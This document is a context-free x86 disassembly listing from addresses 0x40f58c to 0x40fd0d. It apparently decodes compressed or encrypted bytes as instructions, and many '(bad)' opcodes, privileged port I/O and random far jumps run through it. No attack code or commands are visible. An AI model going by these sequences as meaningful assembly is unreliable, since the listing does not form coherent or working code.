  40f58c:	imul   esi,DWORD PTR ds:0x18aafe67,0xffffffe3
  40f593:	aad    0x27
  40f595:	enter  0x9615,0x36
  40f599:	adc    bl,bh
  40f59b:	push   es
  40f59c:	les    edi,FWORD PTR [esi]
  40f59e:	clc    
  40f59f:	jo     0x40f60d
  40f5a1:	cmp    BYTE PTR [eax-0x423cca4f],0x6b
  40f5a8:	or     BYTE PTR [esi+ebx*1],cl
  40f5ab:	add    esi,DWORD PTR [edi-0x3bd48f4a]
  40f5b1:	mov    eax,ds:0xcdf738ed
  40f5b6:	(bad)  
  40f5b7:	aam    0xa8
  40f5b9:	and    dl,al
  40f5bb:	push   ecx
  40f5bc:	pop    ss
  40f5bd:	push   0x54fa0002
  40f5c2:	leave  
  40f5c3:	sbb    eax,0xb0bbf513
  40f5c8:	adc    ecx,DWORD PTR [esi+ebp*1+0x5d837312]
  40f5cf:	and    al,0xa3
  40f5d1:	or     ebx,DWORD PTR [ebx]
  40f5d3:	mov    ah,0x5b
  40f5d5:	sub    edi,0x8ca49a80
  40f5db:	push   0xa
  40f5dd:	scas   al,BYTE PTR es:[edi]
  40f5de:	cmp    ah,BYTE PTR [edx-0x2f499392]
  40f5e4:	mov    bh,BYTE PTR [esi+0x28]
  40f5e7:	ja     0x40f5f0
  40f5e9:	ins    DWORD PTR es:[edi],dx
  40f5ea:	stos   DWORD PTR es:[edi],eax
  40f5eb:	fidiv  DWORD PTR [esi]
  40f5ed:	inc    ebp
  40f5ee:	pop    ss
  40f5ef:	ret    0xecdb
  40f5f2:	push   ebx
  40f5f3:	adc    DWORD PTR [ebp+0x2a56d0b],esi
  40f5f9:	cmp    BYTE PTR [eax-0x7f],dl
  40f5fc:	xor    ah,BYTE PTR [edi-0x49598b54]
  40f602:	test   eax,0xddc505b8
  40f607:	inc    ebx
  40f608:	pop    eax
  40f609:	cmp    al,0x5
  40f60b:	outs   dx,BYTE PTR ds:[esi]
  40f60d:	ins    BYTE PTR es:[edi],dx
  40f60e:	mov    ah,0x85
  40f610:	sahf   
  40f611:	and    eax,0xbb963edc
  40f616:	push   ds
  40f617:	cmp    ebx,DWORD PTR [eax+ebx*8]
  40f61a:	xchg   esi,eax
  40f61b:	mov    edx,0xe460aa80
  40f620:	aam    0xa4
  40f622:	or     bl,bl
  40f624:	add    DWORD PTR [ebp-0x25],esi
  40f627:	adc    eax,0x3a05503a
  40f62c:	data16 data16 cs mov bl,0x11
  40f631:	fild   DWORD PTR [esi]
  40f633:	pusha  
  40f634:	dec    ecx
  40f635:	or     DWORD PTR [eax],ebp
  40f637:	icebp  
  40f638:	repnz fnsave ds:0xfd75b836
  40f63f:	or     BYTE PTR [ebx+ebx*1],dl
  40f642:	xlat   BYTE PTR ds:[ebx]
  40f643:	rcl    DWORD PTR [edi-0x1a92d200],1
  40f649:	mov    edi,0xde6e3b
  40f64e:	daa    
  40f64f:	ret    0x1c00
  40f652:	enter  0xdec,0x4a
  40f656:	cmp    ch,dl
  40f658:	mov    al,0xd0
  40f65a:	and    BYTE PTR fs:[edx],cl
  40f65d:	add    bh,ch
  40f65f:	jae    0x40f638
  40f661:	pop    ebx
  40f662:	mov    eax,0xd17cb5b0
  40f667:	push   ebp
  40f668:	mov    cl,0xd0
  40f66a:	cmp    al,0xbf
  40f66c:	pop    esi
  40f66d:	shl    DWORD PTR [esi+0x550a36d8],cl
  40f673:	dec    ebp
  40f674:	test   dh,0x80
  40f677:	sub    esi,DWORD PTR [ecx-0x31d5af4f]
  40f67d:	dec    edi
  40f67e:	and    cl,BYTE PTR [esi+0x59]
  40f681:	ret    0x5aae
  40f684:	mov    edx,0x95274296
  40f689:	jo     0x40f613
  40f68b:	jno    0x40f6fb
  40f68d:	call   0x85e680e2
  40f692:	push   edx
  40f693:	sahf   
  40f694:	pop    edi
  40f695:	add    DWORD PTR [edx+edx*1-0x4f],esp
  40f699:	mov    cl,0xb0
  40f69b:	(bad)  
  40f69c:	push   ecx
  40f69d:	mov    ch,0xf3
  40f69f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6a0:	bound  ecx,QWORD PTR [eax]
  40f6a2:	and    dh,BYTE PTR [esi+0x15488dc2]
  40f6a8:	mov    esp,0xb6dfbf1c
  40f6ad:	inc    eax
  40f6ae:	sub    al,0xb4
  40f6b0:	repnz cmp dh,BYTE PTR [edx]
  40f6b3:	xchg   ecx,eax
  40f6b4:	mov    eax,ds:0x6daddb11
  40f6b9:	mov    bh,0x5f
  40f6bb:	cmp    cl,bl
  40f6bd:	mov    al,0xe6
  40f6bf:	xor    bh,BYTE PTR [edi+0x6cf8556d]
  40f6c5:	cs ins DWORD PTR es:[edi],dx
  40f6c7:	pop    ebp
  40f6c8:	adc    al,0xc1
  40f6ca:	adc    al,0xf5
  40f6cc:	mov    WORD PTR [ebp-0x2a],?
  40f6cf:	mov    esi,0xd0b544ad
  40f6d4:	mov    al,0x55
  40f6d6:	push   edx
  40f6d7:	mov    ah,0xe3
  40f6d9:	ins    DWORD PTR es:[edi],dx
  40f6da:	mov    eax,ds:0xaf90da96
  40f6df:	sub    DWORD PTR [edx+0x43],esp
  40f6e2:	inc    eax
  40f6e3:	jle    0x40f677
  40f6e5:	adc    ch,BYTE PTR [ebx+ecx*2+0x1b]
  40f6e9:	mov    edx,0xadcf830c
  40f6ee:	push   0x41
  40f6f0:	fcmovnu st,st(0)
  40f6f2:	mov    dh,0xc2
  40f6f4:	retf   0x8f82
  40f6f7:	loop   0x40f75b
  40f6f9:	and    eax,0xdb865a48
  40f6fe:	(bad)  
  40f6ff:	push   esp
  40f700:	jno    0x40f75a
  40f702:	icebp  
  40f703:	mov    fs:0x26ce8d5c,eax
  40f709:	aad    0xb8
  40f70b:	mov    al,0xb5
  40f70d:	(bad)  
  40f710:	es dec edi
  40f712:	jne    0x40f756
  40f714:	fsubr  DWORD PTR [ebp-0x57]
  40f717:	inc    ecx
  40f718:	mov    ah,0x58
  40f71a:	rcr    ch,0x2f
  40f71d:	test   al,0x8f
  40f71f:	das    
  40f720:	mov    al,0x6d
  40f722:	fndisi(8087 only) 
  40f724:	outs   dx,DWORD PTR ds:[esi]
  40f725:	mov    eax,ds:0x141d7a29
  40f72a:	push   ss
  40f72b:	or     al,0xb4
  40f72d:	add    BYTE PTR [ecx+0x2a],al
  40f730:	push   ss
  40f731:	outs   dx,BYTE PTR ds:[esi]
  40f732:	sub    eax,0xf055a6db
  40f737:	pop    eax
  40f738:	dec    edx
  40f739:	jno    0x40f716
  40f73b:	push   ss
  40f73c:	mov    edx,0x1737df5d
  40f741:	fst    st(6)
  40f743:	cmp    edx,DWORD PTR [edi+0x54]
  40f746:	and    eax,ebx
  40f748:	outs   dx,BYTE PTR ds:[esi]
  40f749:	sbb    eax,0x9f6e5b11
  40f74e:	aad    0x23
  40f750:	and    dh,BYTE PTR [esp+ebp*2-0x49]
  40f754:	lods   eax,DWORD PTR ds:[esi]
  40f755:	mov    al,0x42
  40f757:	and    ebp,DWORD PTR [ebx]
  40f759:	ret    0x8c3a
  40f75c:	jle    0x40f7b8
  40f75e:	out    0xba,al
  40f760:	lods   eax,DWORD PTR ds:[esi]
  40f761:	jne    0x40f706
  40f763:	sub    eax,0x1b5cd45b
  40f768:	jp     0x40f721
  40f76a:	xchg   edi,eax
  40f76b:	mov    eax,ds:0x85a5c576
  40f770:	in     eax,0x73
  40f772:	clc    
  40f773:	enter  0xb8eb,0x24
  40f777:	jbe    0x40f726
  40f779:	inc    esp
  40f77a:	jne    0x40f7f7
  40f77c:	fcmove st,st(6)
  40f77e:	inc    ebp
  40f77f:	or     BYTE PTR [ebp-0x45fbf1fe],dh
  40f785:	mov    al,0x50
  40f787:	sub    bh,BYTE PTR [ebx]
  40f789:	loopne 0x40f7a1
  40f78b:	ror    BYTE PTR [ebx+0x6dc4e29a],cl
  40f791:	imul   eax,DWORD PTR [edx+0xc11b35c],0xffffffe3
  40f798:	and    al,0x6c
  40f79a:	add    bl,dl
  40f79c:	mov    dh,0xd
  40f79e:	(bad)  
  40f79f:	in     eax,0xce
  40f7a1:	sub    DWORD PTR [ebp+0x62],edi
  40f7a4:	loop   0x40f801
  40f7a6:	fidiv  DWORD PTR [esi+0x5318afa6]
  40f7ac:	and    ah,ch
  40f7ae:	dec    esp
  40f7af:	lods   eax,DWORD PTR ds:[esi]
  40f7b0:	or     edx,ebx
  40f7b2:	xchg   BYTE PTR [ebp-0x6d67922e],ah
  40f7b8:	inc    esi
  40f7b9:	inc    eax
  40f7ba:	inc    edi
  40f7bb:	dec    BYTE PTR [edi-0x12]
  40f7be:	xchg   esi,eax
  40f7bf:	add    eax,0x54fc1b6e
  40f7c4:	sub    al,0x7c
  40f7c6:	xor    BYTE PTR [ecx],ah
  40f7c8:	test   DWORD PTR [esi+0x5],esi
  40f7cb:	cmp    DWORD PTR [edx-0x5ebc3bea],esp
  40f7d1:	inc    eax
  40f7d2:	mov    ch,0x2d
  40f7d4:	ins    BYTE PTR es:[edi],dx
  40f7d5:	or     cl,BYTE PTR [eax+0xdfbcf79]
  40f7db:	pop    ebp
  40f7dc:	inc    eax
  40f7dd:	mov    bh,0xb6
  40f7df:	into   
  40f7e0:	push   es
  40f7e1:	imul   ecx,DWORD PTR [ecx+0x6b201267],0x6b
  40f7e8:	loope  0x40f7bc
  40f7ea:	inc    esi
  40f7eb:	fs cmc 
  40f7ed:	xor    dh,dh
  40f7ef:	mov    ecx,0xadd3a773
  40f7f4:	and    eax,0x9a7ca0
  40f7f9:	xchg   cl,dl
  40f7fb:	int    0x9f
  40f7fd:	scas   eax,DWORD PTR es:[edi]
  40f7fe:	pop    edx
  40f7ff:	fdiv   DWORD PTR [esi+0x4479c01c]
  40f805:	adc    al,0xe6
  40f807:	xchg   edi,eax
  40f808:	lock stos DWORD PTR es:[edi],eax
  40f80a:	ret    0x5c50
  40f80d:	je     0x40f817
  40f80f:	inc    ecx
  40f810:	xor    DWORD PTR [esi],0x616058dc
  40f816:	lods   eax,DWORD PTR ds:[esi]
  40f817:	shl    ecx,cl
  40f819:	lea    ebp,[edi]
  40f81b:	scas   al,BYTE PTR es:[edi]
  40f81c:	loop   0x40f7fe
  40f81e:	mov    dh,0x95
  40f820:	test   DWORD PTR [edx],edx
  40f822:	cmp    BYTE PTR [esi+esi*1-0x14],ah
  40f826:	or     al,0x53
  40f828:	arpl   bx,sp
  40f82a:	(bad)  
  40f82b:	shl    BYTE PTR [esi+0x50],cl
  40f82e:	add    eax,0xab19347e
  40f833:	mov    dh,0xf0
  40f835:	push   ebp
  40f836:	test   DWORD PTR [ebx],ebx
  40f838:	pop    ebx
  40f839:	pop    ss
  40f83a:	(bad)
  40f83d:	dec    ebx
  40f83e:	inc    esi
  40f83f:	fdiv   QWORD PTR [esi+0x415eada5]
  40f845:	push   es
  40f846:	dec    BYTE PTR [ebx-0x4af704ad]
  40f84c:	ds jne 0x40f88f
  40f84f:	pop    ebp
  40f850:	sub    cl,BYTE PTR [edi-0x7a]
  40f853:	shr    DWORD PTR [ebx-0x7fa5850d],0x6
  40f85a:	mov    edx,0xb654011d
  40f85f:	jmp    0x1ed8:0x5837a997
  40f866:	inc    edi
  40f867:	mov    ch,0x1a
  40f869:	cdq    
  40f86a:	or     eax,0x49b24119
  40f86f:	add    eax,0xda455d6d
  40f874:	mov    esi,0x8256f4b6
  40f879:	mov    dh,0xb6
  40f87b:	mov    bl,0x1c
  40f87d:	and    BYTE PTR ds:0xd6b93068,bl
  40f883:	mov    dh,0x83
  40f885:	call   0xf185954b
  40f88a:	adc    edx,DWORD PTR [ebx+eax*8]
  40f88d:	test   DWORD PTR [ecx],eax
  40f88f:	jo     0x40f832
  40f891:	test   ecx,esi
  40f893:	and    ecx,DWORD PTR [edx-0x5c]
  40f896:	mov    edi,0x3608edb5
  40f89b:	lods   al,BYTE PTR ds:[esi]
  40f89c:	clc    
  40f89d:	call   0xed8f3e5
  40f8a2:	xor    DWORD PTR [ebp+0xdb6d2a5],esp
  40f8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8a9:	(bad)  
  40f8aa:	pop    ebp
  40f8ab:	add    dh,BYTE PTR [edi+edi*4-0x56]
  40f8af:	fcmovbe st,st(6)
  40f8b1:	ret    0xda8d
  40f8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8b5:	int    0x69
  40f8b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8b8:	xor    al,BYTE PTR [eax-0x6e]
  40f8bb:	push   ebx
  40f8bc:	jne    0x40f902
  40f8be:	ins    BYTE PTR es:[edi],dx
  40f8bf:	mov    bh,0xca
  40f8c1:	mov    cl,0xa3
  40f8c3:	ds jne 0x40f84e
  40f8c6:	mov    WORD PTR [ebx-0x284f92b0],fs
  40f8cc:	mov    ah,0x3e
  40f8ce:	xchg   esp,eax
  40f8cf:	mov    eax,ds:0x70b68e3c
  40f8d4:	popa   
  40f8d5:	(bad)  
  40f8d6:	cmp    al,BYTE PTR [eax+0x53fa61f4]
  40f8dc:	sub    bh,BYTE PTR [edx-0x7af4bee6]
  40f8e2:	into   
  40f8e3:	sub    ch,BYTE PTR [edx+0x1]
  40f8e6:	sbb    ch,BYTE PTR [eax-0x535824a5]
  40f8ec:	repnz clc 
  40f8ee:	retf   
  40f8ef:	dec    ebp
  40f8f0:	in     al,0x73
  40f8f2:	or     dh,BYTE PTR [edi-0x4489e9ca]
  40f8f8:	cmp    DWORD PTR [ebx+edi*4+0x61648ac2],edi
  40f8ff:	imul   ebx,DWORD PTR [ebx-0x28],0x56
  40f903:	sbb    al,0x4
  40f905:	enter  0x2c26,0x1f
  40f909:	div    BYTE PTR [edi]
  40f90b:	mov    cl,0x6d
  40f90d:	mov    bh,0x76
  40f90f:	dec    edx
  40f910:	(bad)  
  40f911:	sti    
  40f912:	add    BYTE PTR [ecx+0x4f],0x56
  40f916:	cmp    bl,BYTE PTR [edi+0x54]
  40f919:	cmp    esp,eax
  40f91b:	(bad)  
  40f91c:	inc    esp
  40f91d:	out    0xb2,al
  40f91f:	mov    al,0x7e
  40f921:	aad    0xb4
  40f923:	xchg   edx,eax
  40f924:	mov    ecx,0x4076b452
  40f929:	sar    DWORD PTR [esi-0x499232da],cl
  40f92f:	repnz lods eax,DWORD PTR ds:[esi]
  40f931:	xchg   BYTE PTR [eax],ch
  40f933:	stc    
  40f934:	popa   
  40f935:	or     al,BYTE PTR [eax]
  40f937:	and    esi,DWORD PTR ds:0x74544d8f
  40f93d:	fist   DWORD PTR [esi]
  40f93f:	and    eax,0xb6262ffc
  40f944:	mov    eax,0x5addb6a7
  40f949:	shl    bh,1
  40f94b:	sbb    ecx,DWORD PTR [edi+0x65]
  40f94e:	rcl    DWORD PTR [ecx],0xda
  40f951:	or     DWORD PTR [edx],esi
  40f953:	pusha  
  40f954:	pop    ebx
  40f955:	stos   BYTE PTR es:[edi],al
  40f956:	lods   eax,DWORD PTR ds:[esi]
  40f957:	mov    gs,WORD PTR [ebx+0x8]
  40f95a:	fist   DWORD PTR [ebp-0x4ae24b7f]
  40f960:	mov    ebp,edx
  40f962:	sub    BYTE PTR [ecx],0xc0
  40f965:	call   0x4d51:0x75bb23c6
  40f96c:	and    ch,0x39
  40f96f:	neg    BYTE PTR ds:0x9ae05724
  40f975:	sub    ch,BYTE PTR [esi+0x6d]
  40f978:	stos   DWORD PTR es:[edi],eax
  40f979:	or     BYTE PTR [edi+0x768bdeb6],bh
  40f97f:	inc    eax
  40f980:	mov    cl,0x35
  40f982:	sub    bl,BYTE PTR [ebx-0x49238368]
  40f988:	ins    DWORD PTR es:[edi],dx
  40f989:	mov    eax,ds:0xc25e19e2
  40f98e:	jmp    FWORD PTR [eax+0x73]
  40f991:	cmp    esi,DWORD PTR [eax+ebp*4+0x4762238]
  40f998:	bound  ecx,QWORD PTR [ecx]
  40f99a:	mov    bh,0xe5
  40f99c:	test   al,0x5
  40f99e:	mov    al,0x45
  40f9a0:	adc    BYTE PTR [ecx+0x4c],cl
  40f9a3:	imul   ebp,DWORD PTR [ebx],0x54
  40f9a6:	and    eax,0xb53b47c9
  40f9ab:	jo     0x40f9f0
  40f9ad:	les    esp,FWORD PTR [ebp-0x1a6dde93]
  40f9b3:	cmp    eax,DWORD PTR [edi-0x31]
  40f9b6:	sbb    dh,al
  40f9b8:	aad    0xe
  40f9ba:	pusha  
  40f9bb:	lea    ebp,[edx+0x5f]
  40f9be:	adc    DWORD PTR [edi],edi
  40f9c0:	xchg   ebp,eax
  40f9c1:	mov    edx,0x6fcb0007
  40f9c6:	lds    edx,FWORD PTR [edi+0x6e]
  40f9c9:	add    BYTE PTR [edx-0x25103042],dl
  40f9cf:	xchg   esi,eax
  40f9d0:	cmp    ah,BYTE PTR [eax+0x18]
  40f9d3:	pop    eax
  40f9d4:	ror    BYTE PTR [esi-0xe],0x6a
  40f9d8:	mov    esi,ebp
  40f9da:	ins    DWORD PTR es:[edi],dx
  40f9db:	popa   
  40f9dc:	pop    ebx
  40f9dd:	pop    edx
  40f9de:	or     BYTE PTR ds:0x67ce4ca7,bl
  40f9e4:	fisttp WORD PTR [edi+0x1136a2c5]
  40f9ea:	mov    bh,0xaa
  40f9ec:	and    BYTE PTR [edi-0x41fb5204],cl
  40f9f2:	mov    dh,0xd1
  40f9f4:	sub    BYTE PTR [edx],bh
  40f9f6:	fstp   st(6)
  40f9f8:	aam    0x8d
  40f9fa:	loope  0x40f9fe
  40f9fc:	mov    al,ds:0xdedb4b6e
  40fa01:	rol    DWORD PTR [edi],1
  40fa03:	inc    ecx
  40fa04:	iret   
  40fa05:	push   0x1c065ec3
  40fa0a:	push   ecx
  40fa0b:	cmp    eax,DWORD PTR [edi-0x60c14e62]
  40fa11:	ins    BYTE PTR es:[edi],dx
  40fa12:	ins    DWORD PTR es:[edi],dx
  40fa13:	pop    es
  40fa14:	aam    0x62
  40fa16:	fidivr DWORD PTR [edx+0xeb0b053]
  40fa1c:	push   esp
  40fa1d:	ins    DWORD PTR es:[edi],dx
  40fa1e:	(bad)  [esi+0x71c6936d]
  40fa24:	cli    
  40fa25:	bnd jbe 0x40fa20
  40fa28:	or     dh,ch
  40fa2a:	inc    ebx
  40fa2b:	mov    BYTE PTR [ebp+0x2f47b012],0x46
  40fa32:	std    
  40fa33:	sti    
  40fa34:	nop
  40fa35:	push   esp
  40fa36:	push   ebp
  40fa37:	pop    ss
  40fa38:	jno    0x40f9c3
  40fa3a:	test   eax,0xa961d787
  40fa3f:	test   eax,0x7c6b7685
  40fa44:	jge    0x40fa55
  40fa46:	xchg   ecx,eax
  40fa47:	xlat   BYTE PTR ds:[ebx]
  40fa48:	rcr    ebx,0x6c
  40fa4b:	imul   ebx,DWORD PTR [ebx-0x2f],0xffffff82
  40fa4f:	sbb    DWORD PTR [eax+0x7162db4c],edi
  40fa55:	je     0x40faa7
  40fa57:	jne    0x40fac4
  40fa59:	leave  
  40fa5a:	push   0xffffffd9
  40fa5c:	mul    BYTE PTR [esi+0x6c2d1607]
  40fa62:	sub    al,0x91
  40fa64:	mov    bh,0xc6
  40fa66:	js     0x40fae7
  40fa68:	push   ss
  40fa69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa6a:	fld    TBYTE PTR [ebp-0x25]
  40fa6d:	mov    dh,0xa7
  40fa6f:	(bad)  
  40fa70:	outs   dx,BYTE PTR ds:[esi]
  40fa71:	ror    DWORD PTR [ebp-0x7a],cl
  40fa74:	sub    al,0x4f
  40fa76:	xor    BYTE PTR [ebx+ebp*8+0x41d856ed],cl
  40fa7d:	aaa    
  40fa7e:	test   BYTE PTR [edx+0x231c179a],ah
  40fa84:	add    DWORD PTR [ebx+ecx*1-0x6c],0xffffffb6
  40fa89:	mov    bh,dl
  40fa8b:	in     al,dx
  40fa8c:	xor    eax,0x2d8b7f87
  40fa91:	ficomp DWORD PTR [edx]
  40fa93:	sbb    eax,0xd43db408
  40fa98:	test   BYTE PTR [esi-0x60123fe3],dh
  40fa9e:	or     DWORD PTR [edx],ecx
  40faa0:	mov    eax,0x5634cde0
  40faa5:	mov    bh,0x15
  40faa7:	rol    ch,1
  40faa9:	(bad)  
  40faaa:	inc    esp
  40faab:	mov    ecx,0x6d4e7bff
  40fab0:	sub    BYTE PTR [edx+0x378e75d0],bh
  40fab6:	mov    ds:0xac1e4d9d,al
  40fabb:	push   ecx
  40fabc:	mov    bh,0x76
  40fabe:	mov    eax,ds:0x600d7668
  40fac3:	sbb    eax,0xab3827f8
  40fac8:	frstor [edx+0x3ff0a4c]
  40face:	aaa    
  40facf:	clc    
  40fad0:	call   0x6dc6d2ac
  40fad5:	call   0xb5cf5118
  40fada:	adc    al,0xdf
  40fadc:	pop    edx
  40fadd:	mov    ebx,edx
  40fadf:	ins    DWORD PTR es:[edi],dx
  40fae0:	or     DWORD PTR ds:0xec212384,0x65671bc8
  40faea:	rcl    BYTE PTR [esi-0x5e],cl
  40faed:	mov    dh,0x2b
  40faef:	adc    BYTE PTR [ebx],0xb3
  40faf2:	push   cs
  40faf3:	out    dx,eax
  40faf4:	mov    dh,0xed
  40faf6:	ret    0xfcc6
  40faf9:	pop    ebp
  40fafa:	mov    edi,0x9e500b43
  40faff:	jmp    0xd6db:0x6db8a326
  40fb06:	rcl    DWORD PTR [edi],1
  40fb08:	mov    al,0x71
  40fb0a:	adc    al,0xad
  40fb0c:	xchg   edi,eax
  40fb0d:	pop    ecx
  40fb0e:	test   al,0x1c
  40fb10:	inc    ebx
  40fb11:	jne    0x40fb7e
  40fb13:	sub    BYTE PTR [edx+0x6a],dl
  40fb16:	mov    edi,0x1aadcf18
  40fb1b:	aaa    
  40fb1c:	cmp    ch,BYTE PTR [eax-0x5d]
  40fb1f:	js     0x40fb70
  40fb21:	cmc    
  40fb22:	nop
  40fb23:	jmp    0x40fabb
  40fb25:	push   es
  40fb26:	je     0x40fb93
  40fb28:	dec    ebx
  40fb29:	xchg   edi,eax
  40fb2a:	jmp    0x774f621c
  40fb2f:	clc    
  40fb30:	sbb    eax,0xdb6dcf7c
  40fb35:	(bad)  
  40fb36:	push   ebp
  40fb37:	sub    al,0x80
  40fb39:	cmc    
  40fb3a:	test   BYTE PTR [edi-0x6b29f792],bh
  40fb40:	outs   dx,BYTE PTR ds:[esi]
  40fb41:	(bad)  [esi-0x65d99b9e]
  40fb47:	imul   eax,DWORD PTR [edx],0x5c
  40fb4a:	cli    
  40fb4b:	fdiv   DWORD PTR [eax+0x6e2a1a16]
  40fb51:	repz push es
  40fb53:	imul   ebx,DWORD PTR [esi],0xffffffcd
  40fb56:	xor    eax,edx
  40fb58:	push   ecx
  40fb59:	jne    0x40fb36
  40fb5b:	xchg   esi,eax
  40fb5c:	dec    ebp
  40fb5d:	cmp    al,0xb
  40fb5f:	xor    bh,BYTE PTR [edx+ebx*2+0x86b63dc]
  40fb66:	fcmovu st,st(3)
  40fb68:	into   
  40fb69:	xor    esi,ebp
  40fb6b:	mov    ebp,0x56f9d250
  40fb70:	stc    
  40fb71:	lea    esi,[esi-0x6f]
  40fb74:	mov    dl,0xfe
  40fb76:	xchg   esi,eax
  40fb77:	pop    ss
  40fb78:	jne    0x40fb7a
  40fb7a:	jl     0x40fb1c
  40fb7c:	mov    ch,0xe5
  40fb7e:	in     eax,dx
  40fb7f:	rcl    dh,cl
  40fb81:	xor    al,0xa9
  40fb83:	cmp    BYTE PTR [edi],dl
  40fb85:	fiadd  WORD PTR [esi+0xe]
  40fb88:	sub    eax,0x5b6d8900
  40fb8d:	push   ebx
  40fb8e:	aam    0x7a
  40fb90:	js     0x40fb2f
  40fb92:	adc    BYTE PTR ds:0xd658e0c3,al
  40fb98:	(bad)  
  40fb99:	(bad)  
  40fb9a:	outs   dx,BYTE PTR ds:[esi]
  40fb9b:	jl     0x40fb84
  40fb9d:	stc    
  40fb9e:	xchg   edx,eax
  40fb9f:	(bad)  
  40fba0:	pop    edi
  40fba1:	sub    dh,BYTE PTR [eax+0x3a]
  40fba4:	sub    eax,0x4ce58d6c
  40fba9:	stos   DWORD PTR es:[edi],eax
  40fbaa:	rcr    DWORD PTR [ebx],0x23
  40fbad:	inc    ebx
  40fbae:	xor    DWORD PTR [esi],ebx
  40fbb0:	sbb    bh,BYTE PTR [edi]
  40fbb2:	mov    eax,0x8991e6b4
  40fbb7:	hlt    
  40fbb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbb9:	out    dx,eax
  40fbba:	and    cl,ah
  40fbbc:	xchg   ebx,eax
  40fbbd:	mov    ds:0xf6283405,al
  40fbc2:	test   al,0xa
  40fbc4:	fwait
  40fbc5:	push   0x93ad29a3
  40fbca:	lods   al,BYTE PTR ds:[esi]
  40fbcb:	mov    eax,ds:0x2585d676
  40fbd0:	xchg   esi,eax
  40fbd1:	lods   eax,DWORD PTR ds:[esi]
  40fbd2:	lahf   
  40fbd3:	xor    al,0x45
  40fbd5:	sub    BYTE PTR [ebx+0x361f12a],ch
  40fbdb:	xor    dl,cl
  40fbdd:	pop    esp
  40fbde:	(bad)  
  40fbdf:	pop    ds
  40fbe0:	mov    ah,0xd
  40fbe2:	call   0xe2b1f467
  40fbe7:	jmp    DWORD PTR [ebx-0x76d91989]
  40fbed:	call   0x5b0:0x70096da0
  40fbf4:	mov    bl,0xf9
  40fbf6:	and    ebp,DWORD PTR [edi+esi*1+0x16]
  40fbfa:	ss and edx,esi
  40fbfd:	test   eax,0xed1f0926
  40fc02:	enter  0x8a99,0x6d
  40fc06:	fist   DWORD PTR [ebp-0x13]
  40fc09:	pop    es
  40fc0a:	jae    0x40fc5c
  40fc0c:	jp     0x40fc16
  40fc0e:	fild   DWORD PTR es:0x36e82ec0
  40fc15:	and    eax,0xd42f951b
  40fc1a:	mov    dh,0x21
  40fc1c:	loop   0x40fc60
  40fc1e:	push   0xffffffcf
  40fc20:	aaa    
  40fc21:	dec    edx
  40fc22:	jns    0x40fc6e
  40fc24:	push   cs
  40fc25:	aaa    
  40fc26:	push   ss
  40fc27:	mov    dh,0x8d
  40fc29:	in     eax,dx
  40fc2a:	mov    esp,ebx
  40fc2c:	(bad)  
  40fc2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc2e:	aaa    
  40fc2f:	int3   
  40fc30:	xor    eax,0x7682859c
  40fc35:	imul   esi,DWORD PTR [edi+0x32],0x30
  40fc39:	jecxz  0x40fbd3
  40fc3b:	les    ebp,FWORD PTR [esi]
  40fc3d:	or     dl,BYTE PTR ss:[ecx]
  40fc40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc41:	mov    ebp,0xd826d86b
  40fc46:	cs mov ah,0x87
  40fc49:	jp     0x40fc45
  40fc4b:	jbe    0x40fc05
  40fc4d:	pop    ss
  40fc4e:	fidivr WORD PTR [esi]
  40fc50:	mov    ebx,0xaa506ed4
  40fc55:	mov    edi,DWORD PTR fs:[edi+0xe1648e0]
  40fc5c:	ins    DWORD PTR es:[edi],dx
  40fc5d:	sbb    ebp,ebp
  40fc5f:	push   edx
  40fc60:	mov    dh,0xa5
  40fc62:	adc    ecx,DWORD PTR [ebp-0x13]
  40fc65:	ins    DWORD PTR es:[edi],dx
  40fc66:	or     BYTE PTR [ebp-0x49129392],bl
  40fc6c:	pop    edi
  40fc6d:	mov    esi,0xfb0165bf
  40fc72:	stos   BYTE PTR es:[edi],al
  40fc73:	sbb    bh,BYTE PTR [edx+0x535b0aef]
  40fc79:	mov    ah,0x2b
  40fc7b:	mov    ah,0x64
  40fc7d:	xchg   ebp,eax
  40fc7e:	and    BYTE PTR [edx-0x53],0xcd
  40fc82:	mov    fs,WORD PTR [eax+0x55504b85]
  40fc88:	adc    cl,BYTE PTR [edx]
  40fc8a:	pop    ss
  40fc8b:	or     DWORD PTR [ebx+0x47],ebx
  40fc8e:	(bad)  
  40fc90:	add    eax,0xcc0b6b90
  40fc95:	sbb    eax,0x984a3b9e
  40fc9a:	fistp  DWORD PTR [eax+0x6a]
  40fc9d:	dec    ebp
  40fc9e:	outs   dx,BYTE PTR ds:[esi]
  40fc9f:	add    eax,0x5a0e508c
  40fca4:	aad    0xb3
  40fca6:	push   0xe5696db7
  40fcab:	sbb    ch,BYTE PTR [edx+0x2c]
  40fcae:	mov    edx,?
  40fcb0:	std    
  40fcb1:	pop    ecx
  40fcb2:	lds    esp,FWORD PTR [ebx+0x383805b5]
  40fcb8:	push   es
  40fcb9:	stos   BYTE PTR es:[edi],al
  40fcba:	or     eax,0xa5c00751
  40fcbf:	adc    BYTE PTR gs:[ecx-0x66896165],bl
  40fcc6:	stos   BYTE PTR es:[edi],al
  40fcc7:	or     ebx,DWORD PTR [ebx+0x5b]
  40fcca:	les    edi,FWORD PTR [edi+edx*8+0x1d3a20f1]
  40fcd1:	sbb    BYTE PTR [eax+0x6a],0xdb
  40fcd5:	push   es
  40fcd6:	mov    ebx,ebp
  40fcd8:	test   DWORD PTR [edi-0x36caf718],ecx
  40fcde:	mov    dh,0x5b
  40fce0:	sub    ebx,eax
  40fce2:	pcmpeqb mm3,QWORD PTR [ecx+edx*1+0x4f]
  40fce7:	scas   al,BYTE PTR es:[edi]
  40fce8:	lods   eax,DWORD PTR ds:[esi]
  40fce9:	data16 mov dh,0xdb
  40fcec:	ret    0x2cd6
  40fcef:	(bad)  [esi-0x39]
  40fcf2:	or     al,0x1a
  40fcf4:	and    dh,dl
  40fcf6:	push   ebx
  40fcf7:	mov    ecx,0xd1bb68a1
  40fcfc:	jmp    0xaa4a30b8
  40fd01:	pop    ecx
  40fd02:	and    ebp,DWORD PTR ds:0xddb47c6c
  40fd08:	and    eax,0xa84b22f1
  40fd0d:	outs   dx,DWORD PTR ds:[si]
